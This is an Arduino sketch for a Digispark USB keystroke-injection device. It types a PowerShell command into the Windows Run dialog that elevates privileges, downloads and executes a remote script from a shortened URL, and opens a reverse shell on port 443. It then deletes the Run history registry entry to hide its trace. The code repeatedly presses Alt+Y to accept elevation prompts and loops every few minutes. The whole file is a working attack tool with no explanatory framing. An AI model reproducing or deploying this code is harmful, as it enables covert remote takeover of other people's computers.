#include <DigiKeyboard.h>
void setup()
{
	pinMode(1,OUTPUT);
	DigiKeyboard.sendKeyStroke(0);
}
void loop()
{
	digitalWrite(1,HIGH);
	DigiKeyboard.sendKeyStroke(41);
	delay(500);
	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
	delay(500);
	DigiKeyboard.println("powershell -w 1 saps -verb runas -wi 1 powershell 'iex(new-object net.webclient).downloadstring(''https://git.io/JM7aO'');rsh ''255.255.255.255'' 443';$a='HKCU:\\software\\microsoft\\windows\\currentversion\\explorer\\runmru';rp -pa $a(gp $a).mrulist[0]");
	for(int press = 1;press <= 18;press ++)
	{
		delay(500);
		DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
	}
	DigiKeyboard.sendKeyStroke(41);
	digitalWrite(1,LOW);
	for(int second = 1;second <= 300;second ++)
	{
		delay(250);
		digitalWrite(1,HIGH);
		delay(500);
		digitalWrite(1,LOW);
		delay(250);
	}
}
